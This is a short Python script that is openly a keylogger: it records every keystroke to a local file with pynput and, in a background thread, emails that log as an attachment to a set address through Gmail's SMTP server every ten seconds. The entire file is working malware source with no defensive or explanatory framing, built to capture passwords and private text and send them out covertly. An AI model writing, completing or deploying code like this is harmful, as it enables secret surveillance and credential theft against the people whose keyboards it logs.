#!/usr/bin/env python3
import threading
import time
import smtplib
from email.message import EmailMessage

from dotenv import load_dotenv
from pynput.keyboard import Listener

load_dotenv()

LOG_FILE = "keys.txt"

# Email details
sender_email = "your_email@gmail.com"
receiver_email = "receiver_email@gmail.com"
password = "your_app_password"

mailserver = smtplib.SMTP_SSL("smtp.gmail.com", 465)
mailserver.login(sender_email, password)


def send_email():
    while True:
        try:
            with open(LOG_FILE, "rb") as f:
                file_data = f.read()

            # Create email
            msg = EmailMessage()
            msg["Subject"] = "Keylogger Logs"
            msg["From"] = sender_email
            msg["To"] = receiver_email
            msg.set_content("Attached is the log file.")

            # Attach file
            msg.add_attachment(
                file_data,
                maintype="application",
                subtype="octet-stream",
                filename=f.name,
            )

            mailserver.send_message(msg)
        except FileNotFoundError:
            pass

        time.sleep(10)


def on_press(key):
    with open(LOG_FILE, "a") as log:
        key = str(key).replace("'", "")
        if key == "Key.space":
            key = " "
        elif key == "Key.enter":
            key = "\n"
        elif key == "Key.shift":
            key = ""
        elif key == "Key.backspace":
            key = " [Backspace] "
        elif key == "Key.esc":
            key = " [Escape] "
        log.write(key)


thread = threading.Thread(target=send_email, daemon=True)
thread.start()

with Listener(on_press=on_press) as listener:
    listener.join()
